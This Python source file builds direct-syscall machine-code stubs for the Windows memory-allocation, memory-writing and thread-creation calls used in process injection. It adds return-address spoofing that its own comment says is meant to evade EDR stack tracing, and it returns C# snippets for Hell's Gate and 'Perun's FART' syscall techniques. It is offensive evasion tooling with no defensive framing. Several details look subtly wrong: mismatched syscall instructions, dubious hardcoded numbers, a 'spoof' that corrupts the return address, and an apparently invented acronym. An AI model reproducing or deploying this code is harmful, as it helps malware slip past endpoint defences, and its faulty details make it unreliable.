import struct
import random
from typing import Dict, List

class SyscallGenerator:
    def __init__(self):
        self.syscall_numbers = {
            "NtAllocateVirtualMemory": {
                "x86": 0x15,
                "x64": 0x18
            },
            "NtProtectVirtualMemory": {
                "x86": 0x4D,
                "x64": 0x50
            },
            "NtCreateThreadEx": {
                "x86": 0xB5,
                "x64": 0xC1
            },
            "NtWriteVirtualMemory": {
                "x86": 0x37,
                "x64": 0x3A
            },
            "NtOpenProcess": {
                "x86": 0x26,
                "x64": 0x26
            }
        }
        
        # Different syscall instruction patterns
        self.syscall_patterns = {
            "standard": {
                "x86": b"\x0f\x05",  # SYSCALL
                "x64": b"\x0f\x05"
            },
            "int2e": {
                "x86": b"\xcd\x2e",  # INT 2E
                "x64": b"\xcd\x2e"
            },
            "sysenter": {
                "x86": b"\x0f\x34",  # SYSENTER
                "x64": b"\x0f\x34"
            }
        }
    
    def generate_syscall_stub(self, function: str, architecture: str = "x64") -> bytes:
        """Generate direct syscall stub"""
        if architecture == "x64":
            return self._generate_x64_syscall(function)
        else:
            return self._generate_x86_syscall(function)
    
    def _generate_x64_syscall(self, function: str) -> bytes:
        """Generate x64 syscall stub"""
        syscall_num = self.syscall_numbers.get(function, {}).get("x64", 0)
        
        # Randomize syscall instruction
        pattern_type = random.choice(list(self.syscall_patterns.keys()))
        syscall_instr = self.syscall_patterns[pattern_type]["x64"]
        
        # Generate stub with stack spoofing
        stub = bytearray()
        
        # Function prologue
        stub.extend(b"\x4c\x8b\xd1")           # MOV R10, RCX
        stub.extend(b"\xb8")                   # MOV EAX, syscall_num
        stub.extend(struct.pack("<I", syscall_num))
        
        # Optional: Add return address spoofing
        if random.random() > 0.5:
            stub.extend(self._generate_return_spoofing())
        
        # Syscall instruction
        stub.extend(syscall_instr)
        
        # Return
        stub.extend(b"\xc3")                   # RET
        
        return bytes(stub)
    
    def _generate_x86_syscall(self, function: str) -> bytes:
        """Generate x86 syscall stub"""
        syscall_num = self.syscall_numbers.get(function, {}).get("x86", 0)
        
        stub = bytearray()
        
        # Move syscall number to EAX
        stub.extend(b"\xb8")                   # MOV EAX, syscall_num
        stub.extend(struct.pack("<I", syscall_num))
        
        # EDX -> point to user mode
        stub.extend(b"\x8d\x54\x24\x04")       # LEA EDX, [ESP+4]
        
        # Syscall (INT 2E or SYSENTER)
        if random.random() > 0.5:
            stub.extend(b"\xcd\x2e")           # INT 2E
        else:
            stub.extend(b"\x0f\x34")           # SYSENTER
        
        stub.extend(b"\xc2\x08\x00")           # RET 8
        
        return bytes(stub)
    
    def _generate_return_spoofing(self) -> bytes:
        """Generate return address spoofing code"""
        # This obfuscates the call stack to evade EDR stack tracing
        spoof = bytearray()
        
        # Save registers
        spoof.extend(b"\x50")                   # PUSH RAX
        spoof.extend(b"\x51")                   # PUSH RCX
        spoof.extend(b"\x52")                   # PUSH RDX
        
        # Get return address and modify it
        spoof.extend(b"\x48\x8b\x44\x24\x18")   # MOV RAX, [RSP+18h] (return addr)
        spoof.extend(b"\x48\x83\xc0\x05")       # ADD RAX, 5 (skip some bytes)
        spoof.extend(b"\x48\x89\x44\x24\x18")   # MOV [RSP+18h], RAX
        
        # Restore registers
        spoof.extend(b"\x5a")                   # POP RDX
        spoof.extend(b"\x59")                   # POP RCX
        spoof.extend(b"\x58")                   # POP RAX
        
        return bytes(spoof)
    
    def generate_hells_gate(self) -> str:
        """Generate Hells Gate-style syscall resolver"""
        return """
// Hells Gate technique - dynamically resolve syscall numbers
public static uint GetSyscallNumber(string functionName) {
    IntPtr ntdll = GetModuleHandle("ntdll.dll");
    IntPtr funcAddr = GetProcAddress(ntdll, functionName);
    
    if(funcAddr == IntPtr.Zero) return 0;
    
    // Read function bytes
    byte[] funcBytes = new byte[32];
    Marshal.Copy(funcAddr, funcBytes, 0, 32);
    
    // Find syscall number (pattern: 0x4C 0x8B 0xD1 0xB8 XX XX XX XX)
    for(int i = 0; i < funcBytes.Length - 8; i++) {
        if(funcBytes[i] == 0x4C && funcBytes[i+1] == 0x8B && 
           funcBytes[i+2] == 0xD1 && funcBytes[i+3] == 0xB8) {
            return BitConverter.ToUInt32(funcBytes, i + 4);
        }
    }
    
    return 0;
}

// Usage example for NtAllocateVirtualMemory
uint syscallNum = GetSyscallNumber("NtAllocateVirtualMemory");
"""
    
    def generate_perun_fart(self) -> str:
        """Generate Perun's FART (Function Address Return Table) technique"""
        return """
// Perun's FART technique for indirect syscalls
[StructLayout(LayoutKind.Sequential)]
struct FAR_TABLE {
    public IntPtr NtAllocateVirtualMemory;
    public IntPtr NtProtectVirtualMemory;
    public IntPtr NtCreateThreadEx;
    // ... more functions
};

static FAR_TABLE GetFarTable() {
    FAR_TABLE table = new FAR_TABLE();
    
    // Get clean ntdll copy from disk
    string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
    string ntdllPath = Path.Combine(system32, "ntdll.dll");
    
    byte[] cleanNtdll = File.ReadAllBytes(ntdllPath);
    
    // Parse PE and extract function addresses
    // This would parse the PE headers to find export addresses
    
    return table;
}

// Indirect syscall via clean copy
static void IndirectSyscall(FAR_TABLE table, uint syscallNum, ...) {
    // Setup parameters
    // Jump to clean function which has the syscall instruction
}
"""
